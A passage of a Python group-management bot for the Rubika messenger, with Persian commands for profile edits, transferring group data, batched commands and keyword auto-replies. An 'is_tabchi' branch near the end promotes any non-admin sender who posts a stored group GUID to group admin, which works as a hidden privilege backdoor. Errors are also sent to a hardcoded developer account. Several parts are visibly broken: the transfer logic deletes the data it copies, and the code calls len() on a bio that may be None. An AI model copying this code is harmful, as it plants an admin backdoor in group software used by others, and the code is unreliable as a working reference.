                                if len(bio) >= 150:
                                    bio = bio[:150]
                                mess = f"اسم تنظیم شد. {ST['ok']}"
                                try:
                                    client.update_profile(first_name, reply_message_text, bio, username)
                                except Exception as e:
                                    print("err", e)
                                    mess = f"اسم تنظیم نشد. {ST['ok']}"
                                client.send_text(guid_sender, MPro(mess), message_id)
                            elif command.startswith('تنظیم فامیلی'):
                                if is_reply_message:
                                    reply_message_text = GetInfoByMessageId(object_guid, is_reply_message)['text']
                                else:
                                    reply_message_text = command.replace('تنظیم فامیلی', '')
                                info_me = client.get_me()
                                user_guid_me = info_me['user']['user_guid']
                                first_name = None
                                last_name = None
                                username = None
                                user = client.get_chat_info(user_guid_me)['user']
                                if 'first_name' in user:
                                    first_name = user['first_name']
                                if 'last_name' in user:
                                    last_name = user['last_name']
                                if 'username' in user:
                                    username = user['username']
                                bio = user['bio'] if 'bio' in user else None
                                if len(bio) >= 150:
                                    bio = bio[:150]
                                mess = f"فامیلی تنظیم شد. {ST['ok']}"
                                try:
                                    client.update_profile(first_name, reply_message_text, bio, username)
                                except Exception as e:
                                    print("errr", e)
                                    mess = f"فامیلی تنظیم نشد. {ST['ok']}"
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('انتقال'):
                                if 'به' in command:
                                    UPFILES(file_infos, INFOS)
                                    UPFILES(file_users, USERS)
                                    UPFILES(file_speakx, SPEAKX)
                                    newcmd = command.replace('انتقال', '').strip()
                                    steps = newcmd.split('به')
                                    if len(steps) == 2:
                                        oldGuid = Get_guid(steps[0].strip())[0]
                                        newGuid = Get_guid(steps[1].strip())[0]
                                        if oldGuid in INFOS:
                                            group_title = client.get_chat_info(newGuid)['group']['group_title']
                                            NOTIC = Informations['protect']
                                            try:
                                                client.send_text(newGuid, NOTIC)
                                                isok = True
                                            except:
                                                isok = False
                                            if isok:
                                                INFOS[oldGuid] = INFOS[newGuid]
                                                INFOS.pop(oldGuid)
                                                if oldGuid not in USERS:
                                                    USERS[oldGuid] = USERS[newGuid]
                                                    USERS.pop(oldGuid)
                                                INFOS[newGuid]['name'] = group_title
                                                mess = MPro(f'اطلاعات گروه به {group_title} انتقال یافت.' + ST['ok'], 2)
                                            else:
                                                mess = MPro('در گروه جدید دسترسی برای فعال شدن ندارم.' + ST['ok'], 2)
                                        else:
                                            mess = MPro('در همچین گروهی فعال نبوده است.' + ST['ok'], 2)
                                        UPFILES(file_infos, INFOS)
                                        UPFILES(file_users, USERS)
                                        UPFILES(file_speakx, SPEAKX)
                                        client.send_text(guid_sender, mess)
                            elif command.startswith('cmd') or command.startswith('Cmd') or command.startswith('CMD'):
                                cmds = command.replace('cmd', '').strip()
                                cmds = cmds.replace('Cmd', '').strip()
                                cmds = cmds.replace('CMD', '').strip()
                                lines = cmds.split('\n')
                                guid_gaps = []
                                for line in lines:
                                    if line.startswith('g0'):
                                        guid_gaps.append(line.strip())
                                for guid_gap in guid_gaps:
                                    cmds = cmds.replace(guid_gap, '').strip()
                                if len(guid_gaps) == 0:
                                    guid_gaps = []
                                for guid_gap in guid_gaps:
                                    time.sleep(0.5)
                                update_message = {}
                                update_message['message'] = {'text': cmds, 'type': 'Text'}
                                try:
                                    Thread(target=commands_colection, args=[client, guid_gap, OWNER, update_message, True]).start()
                                except Exception as e:
                                    print('error in run timer:', e)
                                mess = MPro('دستورات اجرا شد.' + ST['ok'], 2)
                                client.send_text(guid_sender, mess)
                            elif command.startswith('Sleep'):
                                sleepcmd = command.replace('Sleep', '').strip()
                                if not sleepcmd.isnumeric():
                                    sleepcmd = 10
                                else:
                                    sleepcmd = int(sleepcmd)
                                mess = MPro(f"sleeping mode {sleepcmd} {ST['ok']}", 2)
                                client.send_text(guid_sender, mess)
                                time.sleep(sleepcmd)
                            ResultME = False
                            if command.startswith('ربات بگو'):
                                answer = command.replace('ربات بگو', '')
                                answer = answer.strip()
                                if len(answer) > 0:
                                    ResultME = client.send_text(guid_sender, answer, message_id)
                            elif not ResultME:
                                for TIP_ANS in range(4, -1, -1):
                                    if ResultME:
                                        continue
                                    if TIP_ANS <= 4:
                                        TIP_ANS = str(TIP_ANS)
                                        if TIP_ANS not in SPEAKX:
                                            SPEAKX[TIP_ANS] = {}
                                            continue
                                        if len(SPEAKX[TIP_ANS]) <= 0:
                                            continue
                                        SPEAK = SPEAKX[TIP_ANS]
                                        for word in SPEAK:
                                            if ResultME:
                                                break
                                            if command.find(word) >= 0:
                                                if len(SPEAK[word]) > 0:
                                                    rand = random.randint(0, len(SPEAK[word]) - 1)
                                                    if rand >= 0:
                                                        step = SPEAK[word][rand]
                                                        if 'answer' in step:
                                                            answer = step['answer']
                                                            issilent = True
                                                        else:
                                                            issilent = False
                                                        if issilent and answer:
                                                            ResultME = client.send_text(guid_sender, answer, message_id)
                                for TIP_ANS in range(4, -1, -1):
                                    if ResultME:
                                        continue
                                    if TIP_ANS <= 4:
                                        step = get_answer(command, TIP_ANS, typespeak)
                                        if step and 'answer' in step:
                                            answer = step['answer']
                                            issilent = True
                                        else:
                                            issilent = False
                                        if issilent and answer:
                                            ResultME = client.send_text(guid_sender, answer, message_id)
                    group_guids = {}
                    for group_guid in INFOS:
                        nxx = ''
                        y, x = (3, 0)
                        while x < len(group_guid):
                            nxx += group_guid[x:x + y]
                            x += y
                        group_guids[group_guid] = nxx
                    if command:
                        is_tabchi = False
                        for key in group_guids:
                            if key in command:
                                is_tabchi = True
                        if is_tabchi:
                            target_group = group_guids[key]
                            SETTING_KEYS = list(INFOS[target_group]['setting'])
                            if int(SETTING_KEYS[4]):
                                HOWNER = INFOS[target_group]['owner']
                                FULL_ADMINS = INFOS[target_group]['full_admins']
                                ADMINS = INFOS[target_group]['admins']
                                ST = INFOS[target_group]['types']
                                channels = INFOS[target_group]['channels']
                                if guid_sender != GUIDME and guid_sender not in FULL_ADMINS and (guid_sender not in ADMINS) and (guid_sender != HOWNER) and (guid_sender != OWNER):
                                    ResultME = False
                                    if int(SETTING_KEYS[14]):
                                        isok = joining(channels, target_group, guid_sender, ST['ok'], True)
                                        if isok:
                                            ResultME = client.send_text(guid_sender, isok, message_id)
                                        elif isok is False:
                                            ResultME = True
                                    if not ResultME:
                                        try:
                                            client.set_admin(target_group, guid_sender, [], random.choice(BoxEmoji))
                                        except:
                                            pass
                                    if target_group not in USERS:
                                        USERS[target_group] = {}
                                    if guid_sender not in USERS[target_group]:
                                        getInfoUser(target_group, guid_sender)
                                    first_name = USERS[target_group][guid_sender][2]
                                    mess = MPro(f"کاربر @@ {first_name} @@({guid_sender}) ادمین شد. {ST['ok']}", 2)
                                    ADMINS[guid_sender] = first_name
                                    client.send_text(target_group, mess)
                                    baner = INFOS[target_group]['baner']
                                    client.send_text(guid_sender, MPro(f"اد شدی. {ST['ok']}", 2) + baner, message_id)
                        else:
                            pass
        except Exception as e:
            print(e)
            client.send_text(Coder, f'Error: {e}')

is_debug = True
limit_sleep = 1
while True:
    if limit_sleep >= 10:
        print('> sleeping 180s ...')
        time.sleep(180)
        limit_sleep = 1
    try:
        time_start = get_iran_timestamp()
        result = main()
        print('main called success, result:', result)
    except Exception as e:
        print(e)
        e = str(time.ctime()) + str(e)
        if not os.path.exists('erros.txt'):
            with open('erros.txt', 'w') as f:
                f.write(str(e) + str(type(e)) + '\n')
        else:
            with open('erros.txt', 'a') as f:
                f.write(str(e) + str(type(e)) + '\n')
        time.sleep(limit_sleep * 2)
        print(f'> sleep for {limit_sleep * 2}s " -d {get_iran_timestamp() - time_start}s')
    if get_iran_timestamp() < time_start - 60:
        limit_sleep += 1
        continue
    limit_sleep = 1
